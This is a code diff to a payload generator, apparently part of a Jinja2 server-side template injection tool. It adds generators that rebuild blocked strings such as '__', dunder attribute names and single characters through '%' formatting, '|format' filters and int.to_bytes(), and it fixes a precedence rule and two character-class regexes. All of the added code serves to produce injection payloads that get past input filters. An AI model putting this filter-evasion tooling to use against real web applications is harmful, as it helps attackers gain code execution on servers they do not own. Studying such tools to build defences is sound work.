@@ -467,7 +467,12 @@ class PayloadGenerator:
         str_result, used_context, tree = result
         result_precedence = tree_precedence(tree)
         assert result_precedence is not None, str_result + repr(tree)
-        if result_precedence < target[1]:
+        should_enclose = (
+            result_precedence <= target[1] 
+            if result_precedence == precedence["mod"] 
+            else result_precedence < target[1]
+        )
+        if should_enclose:
             logger.debug(
                 (
                     "enclose_under_generate: result_precedence < "
@@ -734,6 +739,17 @@ def gen_string_concat_tilde(context: dict, a, b):
     ]
     return [(EXPRESSION, precedence["tilde"], target_list)]
 
+
+@expression_gen
+def gen_string_concat_format(context: dict, a, b):
+    target_list = [
+        (ONEOF, [(LITERAL, "'%s%%s'")], [(LITERAL, '"%s%%s"')], [(VARIABLE_OF, "%s%%s")]),
+        (LITERAL, "%"),
+        (ENCLOSE_UNDER, precedence["mod"], a),
+        (LITERAL, "%"),
+        (ENCLOSE_UNDER, precedence["mod"], b),
+    ]
+    return [(EXPRESSION, precedence["mod"], target_list)]
 
 # ---
 
@@ -2216,6 +2232,20 @@ def gen_string_underline_context(context: dict):
 
 
 @expression_gen
+def gen_string_underline_format(context):
+    targets = [
+        (ONEOF, *[
+            [(LITERAL, '"%c"%')], 
+            [(LITERAL, '"%""c"%')], 
+            [(LITERAL, "'%c'%")],
+            [(LITERAL, "'%''c'%")],
+        ]),
+        (ENCLOSE_UNDER, precedence["mod"], (INTEGER, ord("_")))
+    ]
+    return [(EXPRESSION, precedence["mod"], targets)]
+
+
+@expression_gen
 def gen_string_underline_lipsum(context):
     target_list = [
         (LITERAL, "lipsum|escape|batch("),
@@ -2251,6 +2281,40 @@ def gen_string_underline_gget(context):
 
 # ---
 
+@expression_gen
+def gen_string_twounderline_concat(context):
+    return [(STRING_CONCAT, (STRING_UNDERLINE, ), (STRING_UNDERLINE, ))]
+
+
+@expression_gen
+def gen_string_twounderline_multiply(context):
+    return [(MULTIPLY, (STRING_UNDERLINE, ), (INTEGER, 2))]
+
+@expression_gen
+def gen_string_twounderline_format(context):
+    targets = [
+        (ENCLOSE_UNDER, precedence["mod"], (STRING, "%s%%s")),
+        (LITERAL, "%"),
+        (ENCLOSE_UNDER, precedence["mod"], (STRING_UNDERLINE, )),
+        (LITERAL, "%"),
+        (ENCLOSE_UNDER, precedence["mod"], (STRING_UNDERLINE, )),
+    ]
+    return [(EXPRESSION, precedence["mod"], targets)]
+
+@expression_gen
+def gen_string_twounderline_formatfilter(context):
+    targets = [
+        (ENCLOSE_UNDER, precedence["filter"], (STRING, "%s%%s")),
+        (LITERAL, "|format("),
+        (STRING_UNDERLINE, ),
+        (LITERAL, ")"),
+        (LITERAL, "|format("),
+        (STRING_UNDERLINE, ),
+        (LITERAL, ")"),
+    ]
+    return [(EXPRESSION, precedence["filter_with_function_call"], targets)]
+
+# ---
 
 @expression_gen
 def gen_string_many_format_c_complex(context, num):
@@ -2603,6 +2667,17 @@ def gen_char_cyclerdoc(cotext, c):
     return [(EXPRESSION, precedence["filter"], target_list)]
 
 
+@expression_gen
+def gen_char_format(cotext, c):
+    if ord(c) > 256:
+        return [(UNSATISFIED, )] 
+    return [(EXPRESSION, precedence["mod"], [
+        (ENCLOSE_UNDER, precedence["mod"], (STRING_PERCENT_LOWER_C, )),
+        (LITERAL, "%"),
+        (ENCLOSE_UNDER, precedence["mod"], (INTEGER, ord(c)))
+    ])]
+
+
 # ---
 # 以下的gen_string会互相依赖，但是产生互相依赖时传入的字符串长度会减少所以不会发生无限调用
 
@@ -2679,8 +2754,15 @@ def gen_string_context(context: dict, value: str):
 
 
 @expression_gen
+def gen_string_dunder(context: dict, value: str):
+    if value != "__":
+        return [(UNSATISFIED, )]
+    return [(STRING_TWOUNDERLINE, )]
+
+
+@expression_gen
 def gen_string_removedunder(context: dict, value: str):
-    if not re.match("^__[A_Za-z0-9_]+__$", value):
+    if not re.match("^__[A-Za-z0-9_]+__$", value):
         return [(UNSATISFIED,)]
     twounderline = (MULTIPLY, (STRING_UNDERLINE,), (INTEGER, 2))
     middle = (STRING, value[2:-2])
@@ -2698,7 +2780,7 @@ def gen_string_removedunder(context: dict, value: str):
 
 @expression_gen
 def gen_string_removedunder2(context: dict, value: str):
-    if not re.match("^__[A_Za-z][A_Za-z0-9]+__$", value):
+    if not re.match("^__[A-Za-z][A-Za-z0-9]+__$", value):
         return [(UNSATISFIED,)]
     strings = [
         (STRING_UNDERLINE,),
@@ -2708,6 +2790,38 @@ def gen_string_removedunder2(context: dict, value: str):
         (STRING_UNDERLINE,),
     ]
     return [(STRING_CONCATMANY, strings)]
+
+@expression_gen
+def gen_string_removedunder3(context: dict, value: str):
+    if not re.match("^__[A-Za-z][A-Za-z0-9]+__$", value):
+        return [(UNSATISFIED,)]
+    # "%slo%%s"|format("__")|format("__")
+    tofmt = "%s" + value[2:-2] + "%%s"
+    targets = [
+        (ENCLOSE_UNDER, precedence["mod"], (STRING, tofmt)),
+        (LITERAL, "%"),
+        (ENCLOSE_UNDER, precedence["mod"], (STRING, "__")),
+        (LITERAL, "%"),
+        (ENCLOSE_UNDER, precedence["mod"], (STRING, "__")),
+    ]
+    return [(EXPRESSION, precedence["mod"], targets)]
+
+@expression_gen
+def gen_string_removedunder4(context: dict, value: str):
+    if not re.match("^__[A-Za-z][A-Za-z0-9]+__$", value):
+        return [(UNSATISFIED,)]
+    # "%slo%%s"|format("__")|format("__")
+    tofmt = "%s" + value[2:-2] + "%%s"
+    targets = [
+        (ENCLOSE_UNDER, precedence["filter"], (STRING, tofmt)),
+        (LITERAL, "|format("),
+        (STRING, "__"),
+        (LITERAL, ")"),
+        (LITERAL, "|format("),
+        (STRING, "__"),
+        (LITERAL, ")"),
+    ]
+    return [(EXPRESSION, precedence["filter_with_function_call"], targets)]
 
 
 @expression_gen
@@ -3127,6 +3241,15 @@ def gen_string_lipsumtobytes5(context: dict, value: str):
             ],
         )
     ] + [(REQUIRE_PYTHON3,)]
+
+
+@expression_gen
+def gen_string_intbytes1(context: dict, value: str):
+    if not all(x < 128 for x in value.encode()):
+        return [(UNSATISFIED, )]
+    n = int.from_bytes(value.encode())
+    payload = f"({n}).to_bytes({len(value)}).decode()"
+    return [(EXPRESSION, precedence["function_call"], [(LITERAL, payload)]), (REQUIRE_PYTHON3, )]
 
 
 @expression_gen
